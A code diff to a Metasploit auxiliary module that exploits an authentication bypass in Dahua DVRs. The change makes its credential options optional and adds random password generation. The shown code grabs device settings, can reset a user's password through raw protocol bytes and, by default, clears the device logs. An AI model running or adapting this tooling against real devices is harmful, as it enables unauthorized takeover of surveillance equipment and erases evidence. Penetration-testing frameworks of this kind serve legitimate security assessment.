@@ -5,9 +5,9 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'            => 'Dahua DVR Auth Bypas Scanner',
-      'Version'         => '$Revision: 1 $',
-      'Description'     => 'Scans for Dahua-based DVRs and then grabs settings. Optionally resets a user\'s password and clears the device logs',
+      'Name'            => %q(Dahua DVR Auth Bypass Scanner),
+      'Version'         => '$Revision: 1.1 $',
+      'Description'     => %q(Scans for Dahua-based DVRs and then grabs settings. Optionally resets a user's password and clears the device logs),
       'Author'          => [
         'Jake Reynolds - Depth Security', # Vulnerability Discoverer
         'Tyler Bennett - Talos Infosec' # Metasploit Module
@@ -20,12 +20,17 @@ class Metasploit3 < Msf::Auxiliary
        )
     deregister_options('RHOST')
     register_options([
-      OptString.new('USERNAME', [true, 'A username to reset', '888888']),
-      OptString.new('PASSWORD', [true, 'A password to reset the user with', 'abc123']),
+      OptString.new('USERNAME', [false, 'A username to reset', '888888']),
+      OptString.new('PASSWORD', [false, 'A password to reset the user with']),
       OptBool.new('RESET', [true, 'Reset an existing user\'s pw?', 'FALSE']),
       OptBool.new('CLEAR_LOGS', [true, 'Clear the DVR logs when we\'re done?', 'TRUE']),
       Opt::RPORT(37777)
-    ], self.class)
+    ])
+  end
+
+  def setup
+    @password = datastore['PASSWORD']
+    @password ||= Rex::Text.rand_text_alpha(6)
   end
 
   def run_host(ip)
@@ -195,7 +200,7 @@ class Metasploit3 < Msf::Auxiliary
         data.each { |val| print_status("	#{val[/(([\d]+)[:]([\w]+))/]}") }
       end
       if datastore['RESET']
-        userstring = datastore['USERNAME'] + ":Intel:" + datastore['PASSWORD'] + ":" + datastore['PASSWORD']
+        userstring = datastore['USERNAME'] + ":Intel:" + @password + ":" + @password
         u1 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00" \
              "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         u2 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" \
